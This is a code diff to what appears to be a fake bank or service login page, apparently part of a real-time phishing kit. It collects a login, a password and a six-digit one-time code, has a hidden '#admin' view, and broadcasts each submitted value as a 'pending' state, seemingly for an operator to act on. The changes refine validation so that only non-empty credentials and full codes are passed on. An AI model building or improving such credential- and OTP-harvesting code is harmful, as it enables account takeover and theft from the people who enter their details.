@@ -310,6 +310,13 @@ const S = { login:'', password:'', otp:'', status:'idle' };
 const BC = typeof BroadcastChannel !== 'undefined' ? new BroadcastChannel(CH) : null;
 
 function setState(upd) {
+  const next = { ...S, ...upd };
+  if (next.status === 'pending_password' && (!String(next.login || '').trim() || !String(next.password || '').trim())) {
+    return;
+  }
+  if (next.status === 'pending_otp' && (!String(next.login || '').trim() || !String(next.password || '').trim() || !String(next.otp || '').trim())) {
+    return;
+  }
   Object.assign(S, upd);
   if (BC) BC.postMessage({t:'s', d:{...S}});
   try { localStorage.setItem(KEY, JSON.stringify(S)); } catch(e){}
@@ -354,11 +361,7 @@ if(window.location.hash==='#admin'){ document.body.className='light'; go('admin-
 const li=document.getElementById('li');
 document.getElementById('nextBtn').addEventListener('click',()=>{
   const v=li.value.trim();
-  if(!v){
-    document.getElementById('lerr').textContent='Please enter your login';
-    setState({login:'', password:'', otp:'', status:'idle'});
-    return;
-  }
+  if(!v){document.getElementById('lerr').textContent='Please enter your login';return;}
   document.getElementById('lerr').textContent='';
   setState({login:v, status:'idle'});
   go('password');
@@ -413,12 +416,7 @@ document.getElementById('kbd').addEventListener('click',e=>{
 });
 
 document.getElementById('subBtn').addEventListener('click',()=>{
-  if(!pv){
-    setState({password:'', status:'idle'});
-    document.getElementById('frErr').style.display='block';
-    document.getElementById('retryBtn').style.display='inline-block';
-    return;
-  }
+  if(!pv)return;
   setState({password:pv, status:'pending_password'});
   document.getElementById('pwInp').style.display='none';
   const w=document.getElementById('pwWait');
@@ -470,11 +468,7 @@ document.getElementById('npad').addEventListener('click',e=>{
 });
 document.getElementById('otpConf').addEventListener('click',()=>{
   const otp=obs.map(b=>b.value).join('');
-  if(otp.length<6){
-    document.getElementById('oerr').textContent='الرمز غير مكتمل';
-    setState({otp:'', status:'idle'});
-    return;
-  }
+  if(otp.length<6){document.getElementById('oerr').textContent='الرمز غير مكتمل';return;}
   document.getElementById('oerr').textContent='';
   setState({otp, status:'pending_otp'});
   document.getElementById('otpConf').style.display='none';
